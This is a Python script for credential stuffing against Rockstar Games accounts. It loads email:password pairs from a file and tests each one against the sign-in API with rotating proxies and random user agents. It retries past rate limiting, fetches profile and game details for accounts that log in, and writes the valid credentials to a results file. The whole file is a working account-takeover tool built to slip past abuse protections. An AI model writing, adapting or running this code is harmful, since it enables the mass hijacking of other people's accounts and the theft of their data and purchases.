import requests
import json
import threading
import queue
import time
import random
import logging
import os
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class RockstarChecker:
    def __init__(self):
        init(autoreset=True)
        self.proxy_list = self.load_proxies()
        self.valid_accounts = []
        self.invalid_accounts = []
        self.checked_count = 0
        self.lock = threading.Lock()
        self.setup_logging()
        
    def setup_logging(self):
        if not os.path.exists('logs'):
            os.makedirs('logs')
        logging.basicConfig(
            filename=f'logs/checker_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[!] proxies.txt non trouvé - fonctionnement sans proxy")
            return []

    def get_random_proxy(self):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
        return None

    def check_account(self, email, password):
        ua = UserAgent()
        headers = {
            'User-Agent': ua.random,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://signin.rockstargames.com',
            'Referer': 'https://signin.rockstargames.com/signin'
        }

        data = {
            "email": email,
            "password": password,
            "rememberMe": True,
            "captchaResponse": None
        }

        max_retries = 3
        for attempt in range(max_retries):
            try:
                proxy = self.get_random_proxy()
                response = requests.post(
                    "https://signin.rockstargames.com/api/signin",
                    headers=headers,
                    json=data,
                    proxies=proxy,
                    timeout=15
                )

                if response.status_code == 200:
                    account_info = self.get_account_details(email, password, headers, proxy)
                    return True, account_info
                elif response.status_code == 429:
                    wait_time = random.uniform(5, 10)
                    time.sleep(wait_time)
                    continue
                else:
                    return False, None

            except requests.exceptions.RequestException as e:
                logging.error(f"Tentative {attempt+1}/{max_retries} échouée pour {email}: {str(e)}")
                if attempt == max_retries - 1:
                    return False, None
                time.sleep(random.uniform(2, 5))

        return False, None

    def get_account_details(self, email, password, headers, proxy):
        try:
            response = requests.get(
                "https://socialclub.rockstargames.com/api/profile/info",
                headers=headers,
                proxies=proxy,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'nickname': data.get('nickname', 'Unknown'),
                    'games': data.get('games', []),
                    'creation_date': data.get('created', 'Unknown')
                }
        except:
            pass
        return None

    def save_results(self):
        if not os.path.exists('results'):
            os.makedirs('results')
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        with open(f'results/valid_accounts_{timestamp}.txt', 'w', encoding='utf-8') as f:
            for account in self.valid_accounts:
                f.write(f"{account}\n")
                
        with open(f'results/invalid_accounts_{timestamp}.txt', 'w', encoding='utf-8') as f:
            for account in self.invalid_accounts:
                f.write(f"{account}\n")

    def process_account(self, account):
        try:
            email, password = account.strip().split(':')
        except ValueError:
            logging.error(f"Invalid account format: {account}")
            return

        is_valid, account_info = self.check_account(email, password)
        
        with self.lock:
            self.checked_count += 1
            if is_valid:
                account_str = f"{email}:{password}"
                if account_info:
                    account_str += f" | Nickname: {account_info.get('nickname')} | Games: {len(account_info.get('games', []))}"
                self.valid_accounts.append(account_str)
                print(f"{Fore.GREEN}[✓] VALID: {account_str}")
            else:
                self.invalid_accounts.append(f"{email}:{password}")
                print(f"{Fore.RED}[✗] INVALID: {email}:{password}")
                
            print(f"{Fore.YELLOW}[*] Progression: {self.checked_count} comptes vérifiés")

    def start_checking(self, threads=5):
        print(f"\n{Fore.CYAN}[*] Starting the checker with {threads} threads")
        print(f"{Fore.CYAN}[*] {len(self.proxy_list)} loaded proxies\n")

        try:
            with open('accounts.txt', 'r') as f:
                accounts = f.readlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Error: accounts.txt not found")
            return

        print(f"{Fore.CYAN}[*] {len(accounts)} account load \n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.process_account, accounts)

        self.save_results()
        print(f"\n{Fore.GREEN}[*] Verification completed !")
        print(f"{Fore.GREEN}[*] Valid accounts: {len(self.valid_accounts)}")
        print(f"{Fore.RED}[*] Invalid accounts: {len(self.invalid_accounts)}")

if __name__ == "__main__":
    checker = RockstarChecker()
    checker.start_checking()